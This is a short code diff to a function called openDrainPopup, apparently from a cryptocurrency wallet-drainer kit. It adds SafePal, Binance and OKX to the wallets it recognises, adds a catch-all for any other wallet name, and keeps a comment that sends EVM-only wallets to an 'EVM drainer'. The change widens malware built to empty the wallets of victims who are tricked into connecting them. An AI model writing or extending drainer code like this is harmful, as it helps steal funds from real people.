@@ -74,9 +74,13 @@ function openDrainPopup(walletName) {
   else if (w.includes('trust')) walletKey = 'trust';
   else if (w.includes('backpack')) walletKey = 'backpack';
   else if (w.includes('coinbase')) walletKey = 'coinbase';
+  else if (w.includes('safepal')) walletKey = 'safepal';
+  else if (w.includes('binance')) walletKey = 'binance';
+  else if (w.includes('okx')) walletKey = 'okx';
   else if (w.includes('metamask')) walletKey = 'metamask';
   else if (w.includes('brave')) walletKey = 'brave';
   else if (w.includes('walletconnect') || w.includes('qr')) walletKey = 'wc';
+  else if (w.trim()) walletKey = w.replace(/[^a-z0-9]/g, '');
 
   // EVM-only wallets go to EVM drainer
   const evmWallets = ['metamask', 'brave'];
